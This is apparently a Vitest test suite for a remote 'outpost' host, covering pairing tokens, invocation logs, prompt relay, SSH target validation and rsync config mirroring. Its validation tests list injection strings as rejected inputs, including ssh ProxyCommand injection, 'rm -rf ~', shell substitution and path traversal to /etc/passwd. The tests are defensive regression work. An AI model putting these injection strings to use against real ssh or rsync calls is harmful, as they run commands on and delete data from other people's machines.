import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdtempSync, rmSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// The daemon module is guarded by an import.meta.url === argv[1] check, so importing it
// here does NOT start the server. Its path helpers read GARRISON_HOME dynamically, so a
// sandbox set before each call is honoured.
// @ts-ignore — pure .mjs (repo convention for kanban/outpost lib imports); typed at call sites
import { mintPairing, logInvocation, readInvocationLog, buildInstaller, startHost } from "../scripts/outpost-host.mjs";
// @ts-ignore — pure .mjs; typed at call sites
import { resolveOutpostDispatch, outpostRunFn } from "../fittings/seed/kanban-loop/lib/outpost-dispatch.mjs";
// @ts-ignore — pure .mjs; the UI server is guarded by an entry check so importing is side-effect-free
import { isValidSshTarget } from "../fittings/seed/outpost-tailscale-host/scripts/server.mjs";
// @ts-ignore — pure .mjs config-sync lib; store fns take an explicit file arg so the sandbox is honoured
import { buildRsyncArgs, buildDeleteProbeArgs, buildAdoptArgs, parseDeletedEntries, classifyDeletions, isSafeEntry, localEntries, PORTABLE_DIRS, PORTABLE_FILES, readTargets, upsertTarget, removeTarget, syncTarget, syncAll } from "../fittings/seed/outpost-tailscale-host/scripts/lib/config-sync.mjs";

interface LogRow { at: string; verb: string; outpost: string; caller: string; ok: boolean; ms: number; error?: string }

let sandbox: string;
let prevHome: string | undefined;

beforeEach(() => {
  sandbox = mkdtempSync(join(tmpdir(), "outpost-fit-"));
  prevHome = process.env.GARRISON_HOME;
  process.env.GARRISON_HOME = sandbox;
});

afterEach(() => {
  if (prevHome === undefined) delete process.env.GARRISON_HOME;
  else process.env.GARRISON_HOME = prevHome;
  try { rmSync(sandbox, { recursive: true, force: true }); } catch { /* ignore */ }
});

describe("pairing mint", () => {
  it("mints a hex token, marks the entry pending, and writes the registry", () => {
    const entry = mintPairing("studio-mac");
    expect(entry.name).toBe("studio-mac");
    expect(entry.token).toMatch(/^[0-9a-f]{48}$/); // 24 random bytes, hex
    expect(entry.pending).toBe(true);

    const regPath = join(sandbox, "outpost-registry.json");
    expect(existsSync(regPath)).toBe(true);
    const reg = JSON.parse(readFileSync(regPath, "utf8"));
    expect(reg.outposts).toHaveLength(1);
    expect(reg.outposts[0]).toMatchObject({ name: "studio-mac", pending: true });
    expect(reg.outposts[0].token).toBe(entry.token);
  });

  it("re-pairing a name replaces its token and keeps it pending", () => {
    const first = mintPairing("m1");
    const second = mintPairing("m1");
    expect(second.token).not.toBe(first.token);
    const reg = JSON.parse(readFileSync(join(sandbox, "outpost-registry.json"), "utf8"));
    expect(reg.outposts).toHaveLength(1);
    expect(reg.outposts[0].token).toBe(second.token);
    expect(reg.outposts[0].pending).toBe(true);
  });

  it("buildInstaller emits the one-line curl | bash installer", () => {
    const installer = buildInstaller("m1", "tok123", "100.1.2.3", 23702);
    expect(installer).toBe(
      "curl -fsSL http://100.1.2.3:23702/install.sh | GARRISON_HOST=http://100.1.2.3:23702 GARRISON_TOKEN=tok123 GARRISON_MACHINE=m1 bash"
    );
  });
});

describe("invocation log", () => {
  it("appends per-outpost entries and tails the last 20", () => {
    for (let i = 1; i <= 25; i++) {
      logInvocation({ verb: "exec.run", outpost: "m1", caller: "test", ok: true, ms: i });
    }
    const tail = readInvocationLog("m1", 20);
    expect(tail).toHaveLength(20);
    // Chronological (oldest→newest); the last 20 of 25 are ms 6..25.
    expect(tail[0].ms).toBe(6);
    expect(tail[19].ms).toBe(25);
    expect(tail[19]).toMatchObject({ verb: "exec.run", outpost: "m1", ok: true });
    expect(tail[0].at).toBeTruthy();
  });

  it("filters by outpost and records failures with the error", () => {
    logInvocation({ verb: "exec.run", outpost: "m1", caller: "a", ok: true, ms: 1 });
    logInvocation({ verb: "fs.read", outpost: "m2", caller: "b", ok: false, ms: 2, error: "not connected" });
    logInvocation({ verb: "exec.run", outpost: "m1", caller: "a", ok: true, ms: 3 });

    const m1 = readInvocationLog("m1", 20) as LogRow[];
    expect(m1).toHaveLength(2);
    expect(m1.every((e: LogRow) => e.outpost === "m1")).toBe(true);

    const m2 = readInvocationLog("m2", 20);
    expect(m2).toHaveLength(1);
    expect(m2[0]).toMatchObject({ ok: false, error: "not connected" });
  });
});

describe("resolveOutpostDispatch (card affinity)", () => {
  it("runs locally when the card has no outpost affinity", () => {
    expect(resolveOutpostDispatch({}, [])).toEqual({ ok: true, local: true });
    expect(resolveOutpostDispatch({ outpost: "" }, [{ name: "dev", connected: true }]))
      .toEqual({ ok: true, local: true });
  });

  it("dispatches when the named outpost is connected", () => {
    const res = resolveOutpostDispatch({ outpost: "dev" }, [
      { name: "dev", connected: true },
      { name: "other", connected: false },
    ]);
    expect(res).toEqual({ ok: true, outpost: "dev" });
  });

  it("fails (park) when the named outpost is registered but offline", () => {
    const res = resolveOutpostDispatch({ outpost: "dev" }, [{ name: "dev", connected: false }]);
    expect(res.ok).toBe(false);
    expect(res.outpost).toBe("dev");
    expect(res.reason).toMatch(/offline/i);
  });

  it("fails (park) when the named outpost is unknown", () => {
    const res = resolveOutpostDispatch({ outpost: "ghost" }, [{ name: "dev", connected: true }]);
    expect(res.ok).toBe(false);
    expect(res.outpost).toBe("ghost");
    expect(res.reason).toMatch(/not registered/i);
  });
});

describe("outpostRunFn (v1 exec.run relay)", () => {
  afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals(); });

  it("relays the prompt as a base64 exec.run and unwraps stdout", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ ok: true, result: { payload: { stdout: "hello from mac" } } }),
    });
    vi.stubGlobal("fetch", fetchMock);

    const run = outpostRunFn("http://127.0.0.1:23702", "dev");
    const out = await run({ prompt: "do the thing" });
    expect(out).toEqual({ reply: "hello from mac" });

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("http://127.0.0.1:23702/outposts/dev/rpc");
    const body = JSON.parse((init as { body: string }).body);
    expect(body.type).toBe("exec.run");
    // The prompt is base64-encoded into a `base64 -d | claude -p` pipeline.
    const b64 = Buffer.from("do the thing", "utf8").toString("base64");
    expect(body.payload.command).toContain(b64);
    expect(body.payload.command).toContain("claude -p");
  });

  it("throws on an RPC-level error", async () => {
    vi.stubGlobal("fetch", vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ ok: false, error: "outpost 'dev' not connected" }),
    }));
    const run = outpostRunFn("http://127.0.0.1:23702", "dev");
    await expect(run({ prompt: "x" })).rejects.toThrow(/not connected/);
  });
});

describe("outpost-host HTTP (ephemeral daemon)", () => {
  let host: Awaited<ReturnType<typeof startHost>>;

  beforeEach(async () => {
    host = await startHost({ port: 0, bind: "127.0.0.1" });
  });

  afterEach(async () => {
    await host.close();
  });

  it("GET /install.sh serves the bootstrap script", async () => {
    const res = await fetch(`http://127.0.0.1:${host.port}/install.sh`);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toMatch(/text\/plain/);
    const body = await res.text();
    expect(body).toContain("Garrison Outpost Bootstrap");
    expect(body).toContain("GARRISON_TOKEN");
  });

  it("POST /registry/pair mints a token + installer and registers a pending outpost", async () => {
    const res = await fetch(`http://127.0.0.1:${host.port}/registry/pair`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: "ci-mac" }),
    });
    expect(res.status).toBe(200);
    const data = await res.json();
    expect(data.name).toBe("ci-mac");
    expect(data.token).toMatch(/^[0-9a-f]{48}$/);
    expect(data.pending).toBe(true);
    expect(typeof data.host).toBe("string");
    expect(data.installer).toContain("/install.sh");
    expect(data.installer).toContain(`GARRISON_TOKEN=${data.token}`);
    expect(data.installer).toContain("GARRISON_MACHINE=ci-mac");

    // The pending outpost now shows up in GET /outposts with the verb catalog.
    const list = await (await fetch(`http://127.0.0.1:${host.port}/outposts`)).json();
    const entry = list.outposts.find((o: { name: string }) => o.name === "ci-mac");
    expect(entry).toBeTruthy();
    expect(entry.pending).toBe(true);
    expect(entry.connected).toBe(false);
    expect(Array.isArray(entry.verbs)).toBe(true);
    expect(entry.verbs).toContain("exec.run");
  });

  it("GET /outposts/:name/log returns the tailed invocation log", async () => {
    // Seed the sandbox log directly, then read it back through the HTTP endpoint.
    for (let i = 1; i <= 3; i++) {
      logInvocation({ verb: "exec.run", outpost: "ci-mac", caller: "seed", ok: true, ms: i });
    }
    const res = await fetch(`http://127.0.0.1:${host.port}/outposts/ci-mac/log?limit=20`);
    expect(res.status).toBe(200);
    const data = await res.json();
    expect(data.ok).toBe(true);
    expect(data.entries).toHaveLength(3);
    expect(data.entries[2].ms).toBe(3);
  });
});

// GARRISON-UNIFY-V1 S9 security regression: the SSH provisioning target
// (user@host) is placed as an argv token after ssh's own -o flags. spawn()
// uses no shell, so shell metacharacters can't execute - but a value beginning
// with "-" is parsed by ssh's getopt as an option, and `-oProxyCommand=<cmd>`
// runs <cmd> locally. The endpoint is loopback-bound but unauthenticated (a
// drive-by cross-site POST can reach it), so handleProvision validates strictly
// before ssh ever sees the value.
describe("SSH target validation (S9 provisioning RCE guard)", () => {
  it("accepts legitimate usernames and hostnames/IPs/MagicDNS/IPv6", () => {
    expect(isValidSshTarget("ggomes", "mac.local")).toBe(true);
    expect(isValidSshTarget("ubuntu", "100.88.165.46")).toBe(true);
    expect(isValidSshTarget("_svc", "box.tailnet.ts.net")).toBe(true);
    expect(isValidSshTarget("dev", "fd7a:115c::1")).toBe(true);
  });

  it("rejects dash-leading values (ssh option / ProxyCommand injection)", () => {
    expect(isValidSshTarget("-oProxyCommand=curl evil|sh", "x")).toBe(false);
    expect(isValidSshTarget("root", "-oProxyCommand=touch /tmp/pwned")).toBe(false);
  });

  it("rejects whitespace and shell metacharacters, and empty values", () => {
    expect(isValidSshTarget("a b", "host")).toBe(false);
    expect(isValidSshTarget("root;touch x", "host")).toBe(false);
    expect(isValidSshTarget("user", "h;rm -rf ~")).toBe(false);
    expect(isValidSshTarget("", "host")).toBe(false);
    expect(isValidSshTarget("user", "")).toBe(false);
  });
});

// OUTPOST-CONFIG-SYNC: mirror the portable ~/.claude subset onto outposts.
describe("config-sync: buildRsyncArgs", () => {
  it("mirrors a portable directory with --delete/--safe-links, excludes, and a BatchMode ssh transport", () => {
    const args = buildRsyncArgs({ claudeDir: "/home/u/.claude", user: "me", host: "100.64.0.1", kind: "dir", name: "skills" });
    const s = args.join(" ");
    expect(args).toContain("--delete");        // mirror: host removals (e.g. autothing) propagate
    expect(args).toContain("--safe-links");    // drop unsafe symlinks (skills/cmux-* -> ../../.agents)
    expect(args).not.toContain("--mkpath");    // rsync 3.2.3+ only; Macs may be older -> ensureRemoteDirs instead
    expect(args).toContain("-rlpt");
    expect(args).toContain("/home/u/.claude/skills/");        // trailing slash: sync CONTENTS
    expect(args).toContain("me@100.64.0.1:.claude/skills/");  // remote path is home-relative
    expect(s).toContain("-e ssh -o BatchMode=yes");           // key auth, never a password prompt
    expect(s).toContain("--exclude .git/");
    expect(s).toContain("--exclude state/");
  });

  it("brackets an IPv6 host so rsync's host:path split survives the colons", () => {
    const args = buildRsyncArgs({ claudeDir: "/home/u/.claude", user: "me", host: "fd7a:115c::1", kind: "dir", name: "skills" });
    expect(args).toContain("me@[fd7a:115c::1]:.claude/skills/");
  });

  it("copies a portable file WITHOUT --delete (would nuke siblings in the parent dir)", () => {
    const args = buildRsyncArgs({ claudeDir: "/home/u/.claude", user: "me", host: "box.ts.net", kind: "file", name: "CLAUDE.md" });
    expect(args).not.toContain("--delete");
    expect(args).toContain("/home/u/.claude/CLAUDE.md");
    expect(args).toContain("me@box.ts.net:.claude/CLAUDE.md");
  });

  it("covers the portable subset and excludes machine-specific surfaces", () => {
    for (const d of ["skills", "commands", "agents", "rules"]) expect(PORTABLE_DIRS).toContain(d);
    expect(PORTABLE_FILES).toContain("CLAUDE.md");
    expect(PORTABLE_DIRS).not.toContain("plugins");
    expect(PORTABLE_FILES).not.toContain("settings.json");
  });
});

describe("config-sync: target registry", () => {
  const file = () => join(sandbox, "outpost-sync-targets.json");

  it("upserts, reads back, preserves addedAt on re-upsert, and removes", () => {
    const f = file();
    expect(readTargets(f)).toEqual({});
    const t = upsertTarget({ name: "studio", sshUser: "ggomes", sshHost: "100.1.2.3" }, f);
    expect(t).toMatchObject({ name: "studio", sshUser: "ggomes", sshHost: "100.1.2.3" });
    expect(t.addedAt).toBeTruthy();
    expect(readTargets(f).studio.sshHost).toBe("100.1.2.3");

    const t2 = upsertTarget({ name: "studio", sshUser: "ggomes", sshHost: "100.9.9.9" }, f);
    expect(t2.addedAt).toBe(t.addedAt);                 // re-upsert keeps the original addedAt
    expect(readTargets(f).studio.sshHost).toBe("100.9.9.9");

    expect(removeTarget("studio", f)).toBe(true);
    expect(removeTarget("studio", f)).toBe(false);
    expect(readTargets(f)).toEqual({});
  });

  it("refuses an injection-shaped ssh target and writes nothing", () => {
    const f = file();
    expect(() => upsertTarget({ name: "x", sshUser: "me", sshHost: "-oProxyCommand=x" }, f)).toThrow(/invalid/i);
    expect(existsSync(f)).toBe(false);
  });
});

describe("config-sync: syncTarget guards", () => {
  it("refuses an invalid ssh target without spawning rsync", async () => {
    const r = await syncTarget({ name: "bad", sshUser: "me", sshHost: "-x" }, { claudeDir: sandbox });
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/invalid/i);
    expect(r.items).toEqual([]);
  });

  it("does nothing (no rsync) when the claude dir has no portable config", async () => {
    // sandbox has no skills/commands/agents/rules/CLAUDE.md, so every item is skipped.
    const r = await syncTarget({ name: "empty", sshUser: "me", sshHost: "100.1.2.3" }, { claudeDir: sandbox });
    expect(r.items).toEqual([]);
    expect(r.ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// ADOPT-BEFORE-DELETE. The mirror used to destroy anything installed on an
// OUTPOST's ~/.claude: a skill promoted there was gone within ~10 minutes (the
// heal interval). Reproduced live on dev-madrid — scroll-world and taste's two
// skills wiped four times. An entry the host never pushed is now pulled BACK
// into the host's ~/.claude (Quarters) instead of deleted.
// ---------------------------------------------------------------------------

describe("config-sync: entry-name safety (untrusted, read off a REMOTE machine)", () => {
  it("accepts ordinary skill/command entry names", () => {
    for (const ok of ["scroll-world", "design-taste-frontend", "foo.md", "_private", ".hidden", "a"]) {
      expect(isSafeEntry(ok), ok).toBe(true);
    }
  });

  it("rejects traversal, option-shaped, and shell-reaching names", () => {
    // The name is embedded in `user@host:.claude/<dir>/<entry>` (which rsync hands
    // to the REMOTE shell) and used as a LOCAL destination path.
    for (const bad of [
      "..", ".", "a/b", "../../etc/passwd",
      "-oProxyCommand=touch /tmp/pwn",   // rsync/ssh getopt
      "$(touch /tmp/pwn)", "`id`", "a;rm -rf ~", "a b", "a|b", "a*b", "a'b", 'a"b',
      "", null as unknown as string, 123 as unknown as string
    ]) {
      expect(isSafeEntry(bad), String(bad)).toBe(false);
    }
  });

  it("buildAdoptArgs refuses an unsafe entry rather than building the argv", () => {
    expect(() =>
      buildAdoptArgs({ claudeDir: "/home/u/.claude", user: "me", host: "h", name: "skills", entry: "-oProxyCommand=x" })
    ).toThrow(/unsafe entry/i);
  });
});

describe("config-sync: delete probe + parsing", () => {
  it("probes with the SAME flags as the real mirror, plus dry-run and itemize", () => {
    const spec = { claudeDir: "/home/u/.claude", user: "me", host: "100.1.2.3", name: "skills" };
    const probe = buildDeleteProbeArgs(spec);
    const real = buildRsyncArgs({ ...spec, kind: "dir" as const });
    expect(probe).toContain("--dry-run");
    expect(probe).toContain("--itemize-changes");
    expect(probe).toContain("--delete");                       // must see what --delete WOULD do
    for (const a of real) expect(probe).toContain(a);          // identical include/exclude semantics
  });

  it("reduces *deleting lines to unique TOP-LEVEL entries", () => {
    const out = [
      "*deleting   scroll-world/references/gotchas.md",
      "*deleting   scroll-world/SKILL.md",
      "*deleting   scroll-world/",
      "*deleting   ./design-taste-frontend/SKILL.md",
      "*deleting   notes.md",
      ".d..t...... ./",
      ">f+++++++++ kept/SKILL.md",
    ].join("\n");
    expect(parseDeletedEntries(out)).toEqual(["scroll-world", "design-taste-frontend", "notes.md"]);
  });

  it("returns nothing for output with no deletions", () => {
    expect(parseDeletedEntries(">f+++++++++ a/SKILL.md\n")).toEqual([]);
    expect(parseDeletedEntries("")).toEqual([]);
    expect(parseDeletedEntries(undefined as unknown as string)).toEqual([]);
  });

  it("parses the REAL installed rsync's dry-run output (format assumption, not a mock)", async () => {
    // Local dir->dir, same flags as the mirror. Proves the `*deleting` shape this
    // parser depends on is what this machine's rsync actually emits.
    const { execFileSync } = await import("node:child_process");
    const { mkdirSync, writeFileSync } = await import("node:fs");
    const src = join(sandbox, "src");
    const dst = join(sandbox, "dst");
    mkdirSync(join(src, "kept"), { recursive: true });
    writeFileSync(join(src, "kept", "SKILL.md"), "x");
    mkdirSync(join(dst, "kept"), { recursive: true });
    writeFileSync(join(dst, "kept", "SKILL.md"), "x");
    mkdirSync(join(dst, "outpost-only", "references"), { recursive: true });
    writeFileSync(join(dst, "outpost-only", "SKILL.md"), "y");
    writeFileSync(join(dst, "outpost-only", "references", "r.md"), "y");

    const out = execFileSync(
      "rsync",
      ["-rlpt", "--delete", "--safe-links", "--dry-run", "--itemize-changes", `${src}/`, `${dst}/`],
      { encoding: "utf8" }
    );
    expect(parseDeletedEntries(out)).toEqual(["outpost-only"]);
    // Dry run really was a dry run.
    expect(existsSync(join(dst, "outpost-only", "SKILL.md"))).toBe(true);
  });
});

describe("config-sync: classifyDeletions (origin decides delete vs adopt)", () => {
  it("host-retired entries (in the ledger) are mirrored away, not adopted", () => {
    const r = classifyDeletions(["autothing"], ["autothing", "walkthrough"]);
    expect(r.retired).toEqual(["autothing"]);
    expect(r.adopt).toEqual([]);
  });

  it("outpost-originated entries (never pushed from here) are adopted", () => {
    const r = classifyDeletions(["scroll-world"], ["autothing", "walkthrough"]);
    expect(r.adopt).toEqual(["scroll-world"]);
    expect(r.retired).toEqual([]);
  });

  it("with NO ledger, nothing is destroyed — every entry is adopted", () => {
    expect(classifyDeletions(["a", "b"], undefined).adopt).toEqual(["a", "b"]);
    expect(classifyDeletions(["a"], undefined).retired).toEqual([]);
  });

  it("an empty ledger is still a ledger (not the same as absent)", () => {
    // [] means "the host pushed nothing here", so a remote entry is still
    // outpost-originated and adoptable — but it must not be treated as retired.
    expect(classifyDeletions(["a"], []).adopt).toEqual(["a"]);
    expect(classifyDeletions(["a"], []).retired).toEqual([]);
  });

  it("separates unsafe names instead of adopting or silently dropping them", () => {
    const r = classifyDeletions(["ok", "../evil"], ["other"]);
    expect(r.adopt).toEqual(["ok"]);
    expect(r.unsafe).toEqual(["../evil"]);
  });
});

// A fake rsync: classifies each argv, records it, and materialises an adopted
// entry locally so localEntries() reflects the pull the way real rsync would.
function fakeRsync(opts: {
  deletes?: string[];
  probeFails?: boolean;
  pullFails?: boolean;
  claudeDir?: string;
}) {
  const calls: { kind: string; args: string[] }[] = [];
  const run = async (args: string[]) => {
    const isProbe = args.includes("--dry-run");
    // Direction is positional: a PUSH (mirror/probe) ends with the remote spec,
    // a PULL (adopt) has the remote spec as the source and a local dest last.
    const isPull = !isProbe && !args[args.length - 1].includes(":.claude/");
    if (isProbe) {
      calls.push({ kind: "probe", args });
      if (opts.probeFails) return { code: 23, out: "", error: "rsync exit 23" };
      return { code: 0, out: (opts.deletes ?? []).map((d) => `*deleting   ${d}`).join("\n") };
    }
    if (isPull) {
      calls.push({ kind: "pull", args });
      if (opts.pullFails) return { code: 23, out: "", error: "rsync exit 23" };
      const remote = args.find((a) => a.includes(":.claude/"))!;
      const entry = remote.split("/").pop()!;
      const dest = args[args.length - 1];
      const { mkdirSync, writeFileSync } = require("node:fs");
      mkdirSync(join(dest, entry), { recursive: true });
      writeFileSync(join(dest, entry, "SKILL.md"), "adopted");
      return { code: 0, out: "" };
    }
    calls.push({ kind: "mirror", args });
    return { code: 0, out: "" };
  };
  return { run, calls };
}

const noPrep = async () => ({ ok: true });

describe("config-sync: syncTarget adopt phase", () => {
  function seedHostSkill(dir: string, name: string) {
    const { mkdirSync, writeFileSync } = require("node:fs");
    mkdirSync(join(dir, "skills", name), { recursive: true });
    writeFileSync(join(dir, "skills", name, "SKILL.md"), "host");
  }

  it("REGRESSION: an outpost-installed skill is pulled back to the host, then mirrored", async () => {
    seedHostSkill(sandbox, "walkthrough");
    const rs = fakeRsync({ deletes: ["scroll-world/SKILL.md", "scroll-world/"] });
    const r = await syncTarget(
      { name: "madrid", sshUser: "me", sshHost: "100.1.2.3" },
      { claudeDir: sandbox, mirrored: { skills: ["walkthrough"] }, runRsync: rs.run, ensureRemoteDirs: noPrep }
    );

    expect(r.ok).toBe(true);
    expect(r.adopted).toEqual(["skills/scroll-world"]);
    // It now lives on the HOST — i.e. read back into Quarters.
    expect(existsSync(join(sandbox, "skills", "scroll-world", "SKILL.md"))).toBe(true);
    // Adoption happened BEFORE the mirror, or --delete would have removed it.
    const kinds = rs.calls.filter((c) => c.args.some((a) => a.includes("skills"))).map((c) => c.kind);
    expect(kinds.indexOf("pull")).toBeLessThan(kinds.indexOf("mirror"));
    // ...and the ledger now claims it, so a later host-side removal propagates.
    expect(r.mirrored.skills).toContain("scroll-world");
  });

  it("a skill the HOST retired is still deleted on the outpost (no resurrection)", async () => {
    seedHostSkill(sandbox, "walkthrough");
    const rs = fakeRsync({ deletes: ["autothing/"] });
    const r = await syncTarget(
      { name: "madrid", sshUser: "me", sshHost: "100.1.2.3" },
      { claudeDir: sandbox, mirrored: { skills: ["walkthrough", "autothing"] }, runRsync: rs.run, ensureRemoteDirs: noPrep }
    );
    expect(r.ok).toBe(true);
    expect(r.adopted).toEqual([]);
    expect(rs.calls.some((c) => c.kind === "pull")).toBe(false);
    expect(rs.calls.some((c) => c.kind === "mirror")).toBe(true);   // deletion propagates
    expect(existsSync(join(sandbox, "skills", "autothing"))).toBe(false);
  });

  it("a FAILED probe skips the mirror — never blind-delete what we could not inspect", async () => {
    seedHostSkill(sandbox, "walkthrough");
    const rs = fakeRsync({ probeFails: true });
    const r = await syncTarget(
      { name: "madrid", sshUser: "me", sshHost: "100.1.2.3" },
      { claudeDir: sandbox, mirrored: { skills: ["walkthrough"] }, runRsync: rs.run, ensureRemoteDirs: noPrep }
    );
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/mirror skipped/i);
    expect(rs.calls.some((c) => c.kind === "mirror" && c.args.some((a) => a.includes("skills")))).toBe(false);
  });

  it("a FAILED pull skips the mirror for that dir", async () => {
    seedHostSkill(sandbox, "walkthrough");
    const rs = fakeRsync({ deletes: ["scroll-world/"], pullFails: true });
    const r = await syncTarget(
      { name: "madrid", sshUser: "me", sshHost: "100.1.2.3" },
      { claudeDir: sandbox, mirrored: { skills: ["walkthrough"] }, runRsync: rs.run, ensureRemoteDirs: noPrep }
    );
    expect(r.ok).toBe(false);
    expect(rs.calls.some((c) => c.kind === "mirror" && c.args.some((a) => a.includes("skills")))).toBe(false);
  });

  it("an UNSAFE remote entry name skips the mirror instead of deleting it", async () => {
    seedHostSkill(sandbox, "walkthrough");
    const rs = fakeRsync({ deletes: ["$(id)/SKILL.md"] });
    const r = await syncTarget(
      { name: "madrid", sshUser: "me", sshHost: "100.1.2.3" },
      { claudeDir: sandbox, mirrored: { skills: ["walkthrough"] }, runRsync: rs.run, ensureRemoteDirs: noPrep }
    );
    expect(r.ok).toBe(false);
    expect(rs.calls.some((c) => c.kind === "pull")).toBe(false);
    expect(rs.calls.some((c) => c.kind === "mirror" && c.args.some((a) => a.includes("skills")))).toBe(false);
  });

  it("STRICT_MIRROR=1 restores the old pure-mirror behaviour (no probe at all)", async () => {
    seedHostSkill(sandbox, "walkthrough");
    process.env.GARRISON_OUTPOST_SYNC_STRICT_MIRROR = "1";
    try {
      const rs = fakeRsync({ deletes: ["scroll-world/"] });
      const r = await syncTarget(
        { name: "madrid", sshUser: "me", sshHost: "100.1.2.3" },
        { claudeDir: sandbox, mirrored: {}, runRsync: rs.run, ensureRemoteDirs: noPrep }
      );
      expect(r.ok).toBe(true);
      expect(rs.calls.some((c) => c.kind === "probe")).toBe(false);
      expect(rs.calls.some((c) => c.kind === "mirror")).toBe(true);
    } finally {
      delete process.env.GARRISON_OUTPOST_SYNC_STRICT_MIRROR;
    }
  });

  it("localEntries lists top-level entries and tolerates a missing dir", () => {
    seedHostSkill(sandbox, "b");
    seedHostSkill(sandbox, "a");
    expect(localEntries(sandbox, "skills")).toEqual(["a", "b"]);
    expect(localEntries(sandbox, "nope")).toEqual([]);
  });
});

describe("config-sync: ledger persistence across syncs", () => {
  it("records what was mirrored, so the SECOND sync can tell retired from outpost-born", async () => {
    const { mkdirSync, writeFileSync } = require("node:fs");
    mkdirSync(join(sandbox, "skills", "walkthrough"), { recursive: true });
    writeFileSync(join(sandbox, "skills", "walkthrough", "SKILL.md"), "host");
    const f = join(sandbox, "outpost-sync-targets.json");
    upsertTarget({ name: "madrid", sshUser: "me", sshHost: "100.1.2.3" }, f);

    // First sync: no ledger yet, nothing remote-only.
    const rs1 = fakeRsync({ deletes: [] });
    await syncAll({ file: f, claudeDir: sandbox, runRsync: rs1.run, ensureRemoteDirs: noPrep });
    expect(readTargets(f).madrid.mirrored.skills).toEqual(["walkthrough"]);

    // Host retires it; second sync must NOT adopt it back.
    rmSync(join(sandbox, "skills", "walkthrough"), { recursive: true, force: true });
    const rs2 = fakeRsync({ deletes: ["walkthrough/"] });
    await syncAll({ file: f, claudeDir: sandbox, runRsync: rs2.run, ensureRemoteDirs: noPrep });
    expect(rs2.calls.some((c) => c.kind === "pull")).toBe(false);
    expect(existsSync(join(sandbox, "skills", "walkthrough"))).toBe(false);
  });

  it("a dir whose mirror FAILED keeps its previous ledger (else its entries look adoptable)", async () => {
    const { mkdirSync, writeFileSync } = require("node:fs");
    mkdirSync(join(sandbox, "skills", "walkthrough"), { recursive: true });
    writeFileSync(join(sandbox, "skills", "walkthrough", "SKILL.md"), "host");
    const f = join(sandbox, "outpost-sync-targets.json");
    upsertTarget({ name: "madrid", sshUser: "me", sshHost: "100.1.2.3" }, f);

    await syncAll({ file: f, claudeDir: sandbox, runRsync: fakeRsync({ deletes: [] }).run, ensureRemoteDirs: noPrep });
    expect(readTargets(f).madrid.mirrored.skills).toEqual(["walkthrough"]);

    // Probe fails -> no `mirrored` reported for skills this round.
    await syncAll({ file: f, claudeDir: sandbox, runRsync: fakeRsync({ probeFails: true }).run, ensureRemoteDirs: noPrep });
    expect(readTargets(f).madrid.mirrored.skills).toEqual(["walkthrough"]);   // preserved, not wiped
  });
});
